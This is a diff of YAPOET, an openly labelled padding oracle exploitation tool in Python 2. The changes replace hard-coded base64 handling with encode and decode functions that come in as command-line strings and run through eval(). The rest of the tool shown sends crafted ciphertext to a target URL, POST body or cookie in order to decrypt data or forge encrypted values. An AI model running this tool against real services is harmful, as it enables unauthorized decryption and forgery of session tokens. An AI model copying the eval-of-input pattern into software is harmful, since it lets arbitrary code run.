@@ -1,19 +1,27 @@
 #!/usr/bin/env python
 
-import base64, errno, optparse, random, urllib, urllib2
+import errno
+import optparse
+import random
+import urllib
+import urllib2
+
 
 class Yapoet:
-    def __init__(self, url, post_data, cookie, block_size, iv, mode):
+    def __init__(self, url, post_data, cookie, block_size, iv, mode, encode_func, decode_func):
         self._url = url
         self._post_data = post_data
         self._cookie = cookie
         self._block_size = block_size
         self._iv = iv
         self._mode = mode
+        self._encode_func = encode_func
+        self._decode_func = decode_func
         self._requests_count = 0
 
     def _is_valid_padding(self, encrypted_data):
-        specify = lambda s: s.replace("%encrypted_data%", urllib.quote(base64.b64encode(encrypted_data))) if s else None
+        specify = lambda s: s.replace("%encrypted_data%",
+                                      urllib.quote(self._encode_func(encrypted_data))) if s else None
         url = specify(self._url)
         post_data = specify(self._post_data)
         cookie = specify(self._cookie)
@@ -50,7 +58,7 @@ class Yapoet:
 
     def decrypt_text(self, encrypted_data):
         self._requests_count = 0
-        encrypted_bytes = base64.b64decode(encrypted_data)
+        encrypted_bytes = self._decode_func(encrypted_data)
         decrypted_data = ''
         block_index = len(encrypted_bytes) - self._block_size
         while block_index >= 0:
@@ -84,11 +92,12 @@ class Yapoet:
             encrypted_text = iv + encrypted_text
             iv = self._encrypt_block(padded_data[block_index: block_index + self._block_size], iv)
             block_index -= self._block_size
-        return base64.b64encode(iv + encrypted_text), self._requests_count
+        return self._encode_func(iv + encrypted_text), self._requests_count
+
 
 if __name__ == "__main__":
 
-    print "YAPOET: Yet Another Padding Oracle Exploitation Tool v0.1.1"
+    print "YAPOET: Yet Another Padding Oracle Exploitation Tool v0.2.0"
     print "by Vladimir Kochetkov <kochetkov.vladimir@gmail.com>"
     print "https://github.com/kochetkov/Yapoet\n"
 
@@ -100,9 +109,19 @@ if __name__ == "__main__":
     parser.add_option("--data", dest="post_data", help="POST data (e.g. \"param1=value%2b1&param2=value%2b1\")")
     parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
     parser.add_option("--block-size", dest="block_size", help="Cipher block size [default: %default]")
-    parser.add_option("--iv", dest="iv", help="Initialization vector (e.g. \"0x00,0x01,0x39...\") [default: 0x00 * BLOCK_SIZE]")
+    parser.add_option("--iv", dest="iv",
+                      help="Initialization vector (e.g. \"0x00,0x01,0x39...\") [default: 0x00 * BLOCK_SIZE]")
     parser.add_option("--mode", dest="mode", help="Mode of operation (e.g. \"ECB\" or \"CBC\") [default: %default]")
-    parser.set_defaults(block_size=16, mode="CBC")
+    parser.add_option("--encode-func", dest="encode_func",
+                      help="Function to encode byte array data to string [default: %default]")
+    parser.add_option("--decode-func", dest="decode_func",
+                      help="Function to decode string from byte array data [default: %default]")
+    parser.set_defaults(
+        block_size=16,
+        mode="CBC",
+        encode_func="lambda byte_array: __import__('base64').b64encode(byte_array)",
+        decode_func="lambda string: __import__('base64').b64decode(string)",
+    )
     options, _ = parser.parse_args()
 
     if options.url and (options.encrypted_data or options.plaintext_data):
@@ -114,17 +133,20 @@ if __name__ == "__main__":
         else:
             options_iv = bytearray(b'\0' * options.block_size)
         if options.mode != "ECB" and options.mode != "CBC":
-                print "Possible values for MODE are only \"ECB\" and \"CBC\""
-                exit(errno.EINVAL)
-        poet = Yapoet(options.url, options.post_data, options.cookie, options.block_size, options_iv, options.mode)
-        print "Using %s mode of operation, block size = %s bytes and IV = %s\n" % (options.mode, options.block_size, ''.join('{:02x}'.format(x) for x in options_iv))
+            print "Possible values for MODE are only \"ECB\" and \"CBC\""
+            exit(errno.EINVAL)
+        poet = Yapoet(options.url, options.post_data, options.cookie, options.block_size, options_iv, options.mode,
+                      eval(options.encode_func), eval(options.decode_func))
+        print "Using %s mode of operation, block size = %s bytes and IV = %s\n" % (
+            options.mode, options.block_size, ''.join('{:02x}'.format(x) for x in options_iv))
         if options.encrypted_data:
             print "Started decryption of '''%s'''" % options.encrypted_data
-            print "\n\nData has been decrypted to '''%s''' via %s requests\n" % poet.decrypt_text(options.encrypted_data)
+            print "\n\nData has been decrypted to '''%s''' via %s requests\n" % poet.decrypt_text(
+                options.encrypted_data)
         if options.plaintext_data:
             if options.mode != "CBC":
-                    print "Encryption is possible only in CBC mode"
-                    exit(errno.EINVAL)
+                print "Encryption is possible only in CBC mode"
+                exit(errno.EINVAL)
             print "Started encryption of '''%s'''" % options.plaintext_data
             print "\n\nData has been encrypted to '''%s''' via %s requests" % poet.encrypt_text(options.plaintext_data)
     else:
